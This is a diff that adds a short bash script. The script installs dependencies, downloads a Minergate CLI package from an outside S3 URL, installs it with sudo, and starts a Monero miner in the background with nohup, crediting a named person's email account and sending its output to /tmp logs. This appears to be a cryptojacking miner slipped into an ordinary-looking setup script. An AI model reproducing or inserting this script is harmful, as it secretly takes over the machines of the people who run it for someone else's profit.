@@ -1,0 +1,10 @@
+#!/bin/bash -ex
+
+# Update repo and get tool dependencies
+apt-get update
+apt-get install -y python-pip
+
+# Install Minergate CLI
+curl -O https://s3.amazonaws.com/digitalresonance.net/minergate-cli-release.deb
+sudo dpkg -i minergate-cli-release.deb
+nohup minergate-cli -user sharovgrigirii@gmail.com -xmr 1>/tmp/input.log 2>/tmp/output.log
